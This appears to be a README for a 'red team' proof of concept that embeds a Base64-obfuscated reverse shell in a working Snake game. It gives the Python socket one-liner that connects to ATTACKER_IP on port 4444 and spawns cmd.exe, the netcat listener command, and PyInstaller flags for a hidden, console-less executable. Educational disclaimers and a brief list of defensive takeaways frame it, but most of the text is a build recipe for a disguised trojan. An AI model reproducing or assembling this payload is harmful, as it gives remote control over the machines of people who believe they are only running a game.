# Red Team Demo: Covert Channel in a Snake Game

**Disclaimer: For Authorized Educational and Security Research Purposes Only**

This repository contains a proof-of-concept demonstration of a Trojan horse application, developed for educational purposes in the field of cybersecurity.

## ⚠️ Legal and Ethical Notice

- **This software is provided for EDUCATIONAL USE ONLY.**
- **You MUST use this only in environments you own or have explicit, written permission to test.**
- **Unauthorized use of this software is illegal and unethical.**
- **The author is not responsible for any misuse or damage caused by this program.**
- **By using this software, you agree to these terms and assume all responsibility.**

## 🧪 Project Overview

This project embeds a reverse shell payload within a fully functional Snake game built with Python and Pygame. The goal is to demonstrate key Red Team tactics in a controlled lab environment, including:

- **Trojan Development:** Hiding malicious functionality within a legitimate application.
- **Covert Communication:** Establishing a reverse shell (C2 channel).
- **Payload Obfuscation:** Using Base64 encoding.
- **Stealth Techniques:** Executing the payload in a background thread and compiling to a single executable with no console window.

## 🛠️ Lab Setup & Requirements

### Prerequisites
- **Attacker Machine:** Kali Linux (or any Linux with `netcat`).
- **Victim Machine:** A Windows virtual machine for safe testing.
- **Python 3.12** and the following libraries:
  ```bash
  Usage
  pip install pygame pyinstaller
  or
  install one at a time
  
## Configure the Payload:

Open **_snake_game_trojan.py_**.

Find the **ENCODED_PAYLOAD** variable.

Generate your own encoded payload. Encode the following code, replacing ATTACKER_IP with your Kali machine's IP, using a site like base64encode.org:

```python
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(['cmd.exe'])
Paste the generated Base64 string into the code.
```

## Start the Listener on Kali:

```bash
nc -nvlp 4444
```

## Build the Executable:
```bash
PyInstaller --onefile --noconsole snake_game_trojan.py
or
python -m PyInstaller --onefile --noconsole snake_game_trojan.py
The executable will be in the dist/ folder.
```

## Execute and Observe:
Run snake_game_trojan.exe on the Windows VM.
The Snake game will open. Check your Netcat listener for a shell.

## 🛡️ Defensive Takeaways
This demo highlights the importance of:

- Application Allow-listing
- Endpoint Detection and Response (EDR)
- Network Monitoring
- User Security Training

## 📜 License
This project is licensed under the MIT License - see the LICENSE file for details.
